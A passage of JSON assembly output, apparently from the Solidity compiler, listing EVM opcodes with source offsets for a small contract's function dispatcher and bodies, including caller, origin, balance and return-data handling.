										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "SWAP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DIV"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "AND"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "40CAAE06"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "522E1177"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "68E9A07E"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "ADE58CCB"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "CBFC4BCE"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "EFEDC669"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "DUP1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH",
											"value": "FA391C64"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "EQ"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPI"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "JUMPDEST"
										},
										{
											"begin": 651,
											"end": 2387,
											"name": "STOP"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "JUMPDEST"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "POP"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "JUMP"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "JUMPDEST"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "STOP"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "JUMP"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "STOP"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "JUMPDEST"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "POP"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "DUP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SUB"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "DUP2"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "ADD"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SWAP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "DUP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "DUP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SWAP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "ADD"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SWAP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SWAP3"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SWAP2"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "SWAP1"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "POP"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "POP"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "POP"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "JUMP"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "JUMPDEST"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "STOP"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "JUMPDEST"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "POP"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "JUMP"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "JUMPDEST"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "MLOAD"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "DUP1"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "DUP4"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "NOT"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "AND"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "NOT"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "AND"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "DUP2"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "MSTORE"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "ADD"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "DUP3"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "DUP2"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "MSTORE"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "ADD"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "SWAP3"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "POP"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "POP"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "POP"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "MLOAD"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "DUP1"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "SWAP2"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "SUB"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "SWAP1"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "RETURN"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "JUMPDEST"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "DUP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SUB"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "DUP2"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "ADD"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SWAP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "DUP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "DUP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "AND"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SWAP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "ADD"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SWAP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SWAP3"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SWAP2"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "SWAP1"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "JUMP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "JUMPDEST"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "STOP"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "JUMPDEST"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "POP"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "JUMP"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "JUMPDEST"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "MLOAD"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "DUP1"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "DUP3"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "DUP2"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "MSTORE"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "ADD"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "SWAP2"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "POP"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "POP"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "MLOAD"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "DUP1"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "SWAP2"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "SUB"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "SWAP1"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "RETURN"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "JUMPDEST"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "POP"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "JUMP"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "JUMPDEST"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "STOP"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "JUMPDEST"
										},
										{
											"begin": 886,
											"end": 890,
											"name": "ADDRESS"
										},
										{
											"begin": 865,
											"end": 891,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 865,
											"end": 891,
											"name": "AND"
										},
										{
											"begin": 865,
											"end": 875,
											"name": "CALLER"
										},
										{
											"begin": 865,
											"end": 891,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 865,
											"end": 891,
											"name": "AND"
										},
										{
											"begin": 865,
											"end": 891,
											"name": "EQ"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "ISZERO"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "ISZERO"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "PUSH [tag]",
											"value": "32"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "JUMPI"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "DUP1"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "REVERT"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "tag",
											"value": "32"
										},
										{
											"begin": 857,
											"end": 892,
											"name": "JUMPDEST"
										},
										{
											"begin": 911,
											"end": 920,
											"name": "ORIGIN"
										},
										{
											"begin": 903,
											"end": 908,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 903,
											"end": 908,
											"name": "DUP1"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "EXP"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "DUP2"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "SLOAD"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "DUP2"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "MUL"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "NOT"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "AND"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "SWAP1"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "DUP4"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "AND"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "MUL"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "OR"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "SWAP1"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "SSTORE"
										},
										{
											"begin": 903,
											"end": 920,
											"name": "POP"
										},
										{
											"begin": 821,
											"end": 928,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "JUMPDEST"
										},
										{
											"begin": 1074,
											"end": 1075,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1060,
											"end": 1064,
											"name": "ADDRESS"
										},
										{
											"begin": 1052,
											"end": 1073,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1052,
											"end": 1073,
											"name": "AND"
										},
										{
											"begin": 1052,
											"end": 1073,
											"name": "BALANCE"
										},
										{
											"begin": 1052,
											"end": 1075,
											"name": "GT"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "ISZERO"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "ISZERO"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "PUSH [tag]",
											"value": "34"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "JUMPI"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "DUP1"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "REVERT"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 1044,
											"end": 1076,
											"name": "JUMPDEST"
										},
										{
											"begin": 1108,
											"end": 1112,
											"name": "ADDRESS"
										},
										{
											"begin": 1100,
											"end": 1121,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1100,
											"end": 1121,
											"name": "AND"
										},
										{
											"begin": 1100,
											"end": 1121,
											"name": "BALANCE"
										},
										{
											"begin": 1090,
											"end": 1099,
											"name": "CALLVALUE"
										},
										{
											"begin": 1090,
											"end": 1121,
											"name": "GT"
										},
										{
											"begin": 1087,
											"end": 1158,
											"name": "ISZERO"
										},
										{
											"begin": 1087,
											"end": 1158,
											"name": "PUSH [tag]",
											"value": "35"
										},
										{
											"begin": 1087,
											"end": 1158,
											"name": "JUMPI"
										},
										{
											"begin": 1143,
											"end": 1146,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1137,
											"end": 1142,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 1137,
											"end": 1146,
											"name": "DUP2"
										},
										{
											"begin": 1137,
											"end": 1146,
											"name": "SWAP1"
										},
										{
											"begin": 1137,
											"end": 1146,
											"name": "SSTORE"
										},
										{
											"begin": 1137,
											"end": 1146,
											"name": "POP"
										},
										{
											"begin": 1087,
											"end": 1158,
											"name": "tag",
											"value": "35"
										},
										{
											"begin": 1087,
											"end": 1158,
											"name": "JUMPDEST"
										},
										{
											"begin": 1000,
											"end": 1167,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 1594,
											"end": 1745,
											"name": "JUMPDEST"
										},
										{
											"begin": 1672,
											"end": 1676,
											"name": "ADDRESS"
										},
										{
											"begin": 1652,
											"end": 1677,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1652,
											"end": 1677,
											"name": "AND"
										},
										{
											"begin": 1652,
											"end": 1662,
											"name": "CALLER"
										},
										{
											"begin": 1652,
											"end": 1677,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1652,
											"end": 1677,
											"name": "AND"
										},
										{
											"begin": 1652,
											"end": 1677,
											"name": "EQ"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "ISZERO"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "ISZERO"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "JUMPI"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "DUP1"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "REVERT"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 1644,
											"end": 1678,
											"name": "JUMPDEST"
										},
										{
											"begin": 1723,
											"end": 1726,
											"name": "DUP1"
										},
										{
											"begin": 1721,
											"end": 1722,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1714,
											"end": 1727,
											"name": "SSTORE"
										},
										{
											"begin": 1698,
											"end": 1738,
											"name": "POP"
										},
										{
											"begin": 1698,
											"end": 1738,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 1753,
											"end": 2147,
											"name": "JUMPDEST"
										},
										{
											"begin": 1794,
											"end": 1804,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1806,
											"end": 1817,
											"name": "DUP1"
										},
										{
											"begin": 1882,
											"end": 1886,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1866,
											"end": 1880,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 1863,
											"end": 1887,
											"name": "EQ"
										},
										{
											"begin": 1856,
											"end": 1888,
											"name": "ISZERO"
										},
										{
											"begin": 1853,
											"end": 1855,
											"name": "ISZERO"
										},
										{
											"begin": 1853,
											"end": 1855,
											"name": "PUSH [tag]",
											"value": "39"
										},
										{
											"begin": 1853,
											"end": 1855,
											"name": "JUMPI"
										},
										{
											"begin": 1901,
											"end": 1902,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1898,
											"end": 1899,
											"name": "DUP1"
										},
										{
											"begin": 1891,
											"end": 1903,
											"name": "REVERT"
										},
										{
											"begin": 1853,
											"end": 1855,
											"name": "tag",
											"value": "39"
										},
										{
											"begin": 1853,
											"end": 1855,
											"name": "JUMPDEST"
										},
										{
											"begin": 1936,
											"end": 1940,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1930,
											"end": 1941,
											"name": "MLOAD"
										},
										{
											"begin": 1978,
											"end": 1982,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1975,
											"end": 1976,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1970,
											"end": 1973,
											"name": "DUP3"
										},
										{
											"begin": 1955,
											"end": 1983,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 2020,
											"end": 2086,
											"name": "PUSH",
											"value": "FFFFFFFF00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2014,
											"end": 2017,
											"name": "DUP2"
										},
										{
											"begin": 2008,
											"end": 2018,
											"name": "MLOAD"
										},
